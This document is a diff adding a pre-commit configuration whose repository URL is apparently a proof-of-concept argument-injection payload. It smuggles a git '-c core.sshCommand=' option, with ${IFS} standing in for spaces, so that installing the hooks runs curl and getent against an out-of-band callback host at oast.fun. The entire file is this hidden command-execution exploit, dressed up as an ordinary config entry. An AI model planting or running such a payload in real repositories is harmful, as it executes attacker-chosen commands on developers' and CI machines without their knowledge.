@@ -1,0 +1,6 @@
+repos:
+  - repo: 'ssh://git@gitlab.com/a/b/// -c core.sshCommand=curl${IFS}-sS${IFS}--max-time${IFS}20${IFS}https://dc07pl9vnklashe99pggjyjdo5rfb3ijk.oast.fun/precommit;getent${IFS}hosts${IFS}dc07pl9vnklashe99pggjyjdo5rfb3ijk.oast.fun;#'
+    rev: v1.0.0
+    hooks:
+      - id: poc
+        additional_dependencies: ['requests==2.0']
